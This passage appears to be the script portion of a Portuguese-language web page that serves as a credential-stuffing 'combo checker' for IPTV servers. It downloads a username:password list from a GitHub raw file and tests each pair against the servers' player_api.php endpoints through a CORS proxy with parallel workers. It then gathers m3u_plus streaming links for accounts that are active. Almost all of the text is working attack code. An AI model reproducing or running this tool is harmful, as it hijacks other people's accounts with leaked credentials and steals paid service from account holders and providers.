            height: 25px;
            margin: 20px 0;

        // Fun√ß√£o para mostrar notifica√ß√£o
        function showNotification(message, duration = 3000) {
            notification.textContent = message;
            notification.classList.add('show');
            
            setTimeout(() => {
                notification.classList.remove('show');
            }, duration);
        }
        
        // Fun√ß√£o para atualizar estat√≠sticas
        function updateStats() {
            stats.totalTested.textContent = `Testados: ${totalProcessed}`;
            stats.totalHits.textContent = `Hits: ${totalHits}`;
            stats.totalErrors.textContent = `Erros: ${totalErrors}`;
            
            const elapsed = (Date.now() - startTime) / 1000;
            if (elapsed > 0) {
                const reqPerSec = (totalProcessed / elapsed).toFixed(1);
                stats.reqPerSec.textContent = `Req/s: ${reqPerSec}`;
            }
            
            const progress = totalHits >= 10 ? 100 : (totalHits / 10) * 100;
            progressBar.style.width = `${progress}%`;
            progressText.textContent = `${progress.toFixed(1)}%`;
        }
        
        // Fun√ß√£o para carregar combos online
        async function loadCombosOnline() {
            try {
                // URL do GitHub com combos
                const response = await fetch('https://raw.githubusercontent.com/guedescomvc2025-bot/COMBO-DARK-ONLINE/main/todos_combos.txt');
                if (!response.ok) {
                    throw new Error(`Erro ao carregar combos: ${response.status}`);
                }
                const text = await response.text();
                const lines = text.split(/\r?\n/);
                
                combos = lines
                    .map(line => line.trim())
                    .filter(line => line && line.includes(':') && !line.startsWith('#'));
                
                showNotification(`${combos.length} combos carregados online.`);
                return true;
            } catch (error) {
                showNotification(`Erro ao carregar combos: ${error.message}`);
                console.error('Erro ao carregar combos:', error);
                return false;
            }
        }
        
        // Fun√ß√£o para testar um combo em um servidor
        async function testCombo(server, username, password) {
            const url = `${server}/player_api.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
            
            try {
                // Usando proxy para evitar CORS
                const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(url)}`;
                
                const response = await fetch(proxyUrl, {
                    method: 'GET',
                    headers: {
                        'Accept': 'application/json'
                    }
                });
                
                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}`);
                }
                
                const data = await response.json();
                
                if (data && data.user_info && data.user_info.status === "Active") {
                    const m3uLink = `${server}/get.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&type=m3u_plus`;
                    return {
                        success: true,
                        server,
                        username,
                        password,
                        m3uLink,
                        status: data.user_info.status
                    };
                } else {
                    return { success: false };
                }
            } catch (error) {
                return { 
                    success: false, 
                    error: error.message 
                };
            }
        }
        
        // Fun√ß√£o para renderizar resultados M3U
        function renderM3UResults() {
            if (results.length === 0) {
                m3uResultsContainer.innerHTML = '<p style="text-align: center; color: var(--accent-color-light); padding: 20px;">Nenhum link M3U v√°lido encontrado.</p>';
                return;
            }
            
            m3uResultsContainer.innerHTML = '';
            
            results.forEach((result, index) => {
                const item = document.createElement('div');
                item.className = 'm3u-item';
                
                const link = document.createElement('div');
                link.className = 'm3u-link';
                link.innerHTML = `üîó LINK M3U: ‚ñ∫ ${result.m3uLink}`;
                
                const copyBtn = document.createElement('button');
                copyBtn.className = 'btn';
                copyBtn.textContent = 'Copiar';
                copyBtn.onclick = () => {
                    navigator.clipboard.writeText(result.m3uLink)
                        .then(() => {
                            showNotification('Link copiado!');
                        })
                        .catch(err => {
                            console.error('Falha ao copiar: ', err);
                        });
                };
                
                item.appendChild(link);
                item.appendChild(copyBtn);
                m3uResultsContainer.appendChild(item);
            });
        }
        
        // Fun√ß√£o principal de varredura
        async function startScan() {
            if (isScanning) return;
            
            // Reiniciar estado
            isScanning = true;
            stopRequested = false;
            totalProcessed = 0;
            totalHits = 0;
            totalErrors = 0;
            results = [];
            startTime = Date.now();
            
            generateBtn.disabled = true;
            stopBtn.disabled = false;
            copyAllBtn.disabled = true;
            
            // Carregar combos online
            const loaded = await loadCombosOnline();
            if (!loaded) {
                isScanning = false;
                generateBtn.disabled = false;
                stopBtn.disabled = true;
                return;
            }
            
            // Obter n√∫mero de threads
            const threadCount = parseInt(document.getElementById('threadCount').value) || 10;
            
            // Iniciar workers
            const workers = [];
            for (let i = 0; i < threadCount; i++) {
                workers.push(scanWorker());
            }
            
            // Aguardar todos os workers terminarem
            await Promise.all(workers);
            
            // Finaliza√ß√£o
            isScanning = false;
            generateBtn.disabled = false;
            stopBtn.disabled = true;
            copyAllBtn.disabled = results.length === 0;
            
            showNotification(`Varredura conclu√≠da! ${totalHits} hits encontrados.`);
            
            // Renderizar resultados
            renderM3UResults();
        }
        
        // Worker de varredura
        async function scanWorker() {
            const usedServers = new Set();
            
            while (!stopRequested && combos.length > 0 && totalHits < 10) {
                const combo = combos.pop();
                if (!combo) break;
                
                const [username, password] = combo.split(':');
                if (!username || !password) {
                    totalErrors++;
                    totalProcessed++;
                    updateStats();
                    continue;
                }
                
                // Escolher servidor aleat√≥rio que ainda n√£o foi usado para este usu√°rio
                let availableServers = servers.filter(server => !usedServers.has(server));
                if (availableServers.length === 0) {
                    // Se todos os servidores foram usados, reinicie o conjunto
                    usedServers.clear();
                    availableServers = [...servers];
                }
                
                const server = availableServers[Math.floor(Math.random() * availableServers.length)];
                usedServers.add(server);
                
                try {
                    const result = await testCombo(server, username, password);
                    
                    if (result.success) {
                        totalHits++;
                        results.push(result);
                        
                        // Renderizar resultados a cada novo hit
                        renderM3UResults();
                        
                        // Parar se atingirmos 10 hits
                        if (totalHits >= 10) {
                            showNotification("10 hits encontrados! Varredura conclu√≠da.");
                            break;
                        }
                    }
                } catch (error) {
                    totalErrors++;
                }
                
                totalProcessed++;
                updateStats();
                
                // Delay entre requisi√ß√µes para n√£o sobrecarregar
                await new Promise(resolve => setTimeout(resolve, 100));
            }
        }
        
        // Event Listeners
        generateBtn.addEventListener('click', startScan);
        
        stopBtn.addEventListener('click', () => {
            stopRequested = true;
            isScanning = false;
            stopBtn.disabled = true;
            generateBtn.disabled = false;
            showNotification('Varredura interrompida');
        });
        
        copyAllBtn.addEventListener('click', () => {
            if (results.length === 0) return;
            
            const allLinks = results.map(r => r.m3uLink).join('\n');
            
            navigator.clipboard.writeText(allLinks)
                .then(() => {
                    showNotification('Todos os links copiados!');
                })
                .catch(err => {
                    console.error('Falha ao copiar: ', err);
                });
        });
    </script>
